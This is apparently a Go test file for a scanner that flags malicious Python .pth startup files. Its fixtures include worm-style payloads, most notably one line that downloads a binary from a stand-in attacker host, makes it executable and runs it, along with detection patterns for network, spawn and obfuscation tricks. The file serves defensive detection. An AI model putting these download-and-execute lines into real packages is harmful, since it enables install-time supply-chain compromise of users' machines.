package pthscan_test

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
)

func codes(v pthscan.Verdict) []string {
	out := make([]string, 0, len(v.Signals))
	for _, s := range v.Signals {
		out = append(out, s.Code)
	}
	return out
}

func hasSignal(v pthscan.Verdict, code string) bool {
	for _, s := range v.Signals {
		if s.Code == code {
			return true
		}
	}
	return false
}

func TestInspectEmpty(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte{}})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectPathOnly(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n../sibling\n# a comment\n\n")})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectExecutableLineMedium(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("import some_legit_module\n")})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-executable-line"), "got %v", codes(v))
}

func TestInspectTruncatedIsCritical(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n"), Truncated: true})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-file-too-large"))
}

func TestInspectIgnoresLeadingWhitespace(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("    import x\n")})
	require.True(t, v.Flagged())
	require.True(t, hasSignal(v, "pth-executable-line"))
}

func TestInspectIgnoresCommentLines(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("# import a\n# not executable\n")})
	require.False(t, v.Flagged())
}

func TestInspectAllowsDistutilsPrecedence(t *testing.T) {
	body := `import os; var = os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local'); __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged(), "got %v", codes(v))
}

func TestInspectAllowsBareDistutilsHack(t *testing.T) {
	body := `import os; __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsPEP660Editable(t *testing.T) {
	body := `import __editable___my_pkg_0_1_0_finder; __editable___my_pkg_0_1_0_finder.install()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "__editable__.my_pkg-0.1.0.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsLegacyEasyInstall(t *testing.T) {
	body := `import sys; sys.__plen = len(sys.path)`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "easy-install.pth"})
	require.False(t, v.Flagged())
}

func TestInspectRejectsAllowlistImpostor(t *testing.T) {
	// A worm that mentions __editable__ but otherwise smuggles payload-shaped
	// content past the anchored allowlist must still be flagged.
	body := `import __editable___finder; import urllib.request; urllib.request.urlretrieve('http://attacker/x','x')`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
	require.True(t, v.Flagged())
}

// hadesPth is the canonical Hades shape: a `*-setup.pth` carrying an
// import-line that fetches Bun, drops _index.js, and execs it. We exercise
// each payload group at least once.
const hadesPth = `import urllib.request, os, subprocess; ` +
	`urllib.request.urlretrieve('https://attacker.tld/bun', '/tmp/bun'); ` +
	`os.chmod('/tmp/bun', 0o755); ` +
	`subprocess.Popen(['/tmp/bun', '/tmp/_index.js'])` + "\n"

func TestInspectFlagsHadesPth(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(hadesPth),
		FileName:   "ensmallen-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-payload-network"), "got %v", codes(v))
	require.True(t, hasSignal(v, "pth-payload-spawn"))
	require.True(t, hasSignal(v, "pth-payload-runtime-fetch"))
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectPayloadGroupsTable(t *testing.T) {
	cases := []struct {
		name string
		body string
		want string
	}{
		{"network-urllib", "import urllib.request as r", "pth-payload-network"},
		{"network-requests", "import requests as r", "pth-payload-network"},
		{"spawn-subprocess", "import subprocess as s", "pth-payload-spawn"},
		{"spawn-os-system", "import os; os.system('x')", "pth-payload-spawn"},
		{"dynamic-exec", "import x; exec(x)", "pth-payload-dynamic-exec"},
		{"deobfuscation-b64", "import base64; base64.b64decode('xx')", "pth-payload-deobfuscation"},
		{"deobfuscation-hex-escapes", `import x; exec("\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad")`, "pth-payload-deobfuscation"},
		{"runtime-fetch-bun", "import os; os.popen('bun /tmp/x.js')", "pth-payload-runtime-fetch"},
		{"runtime-fetch-curl", "import os; os.popen('curl http://x')", "pth-payload-runtime-fetch"},
		{"worm-marker-bun-ran", "import os; open('/tmp/.bun_ran','w').close()", "pth-payload-worm-marker"},
		{"worm-marker-name", "import os; os.system('echo shai-hulud')", "pth-payload-worm-marker"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(c.body + "\n")})
			require.True(t, v.Flagged())
			require.Equal(t, pthscan.SeverityCritical, v.Severity)
			require.True(t, hasSignal(v, c.want), "missing %s; got %v", c.want, codes(v))
		})
	}
}

func TestInspectSetupFilenameAloneIsMedium(t *testing.T) {
	// A `*-setup.pth` with only path-entry lines and no executable line is
	// suspicious (no real ecosystem ships this name) but not on its own a
	// critical install-time payload.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte("some/path\n"),
		FileName:   "evil-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectEditableFilenameNotFlagged(t *testing.T) {
	// __editable__.foo-1.2.3.pth ending in `-1.2.3.pth` must not be confused
	// with `-setup.pth` even though both end in `.pth`.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(`import __editable___foo_1_2_3_finder; __editable___foo_1_2_3_finder.install()` + "\n"),
		FileName:   "__editable__.foo-1.2.3.pth",
	})
	require.False(t, v.Flagged(), "got %v", codes(v))
}
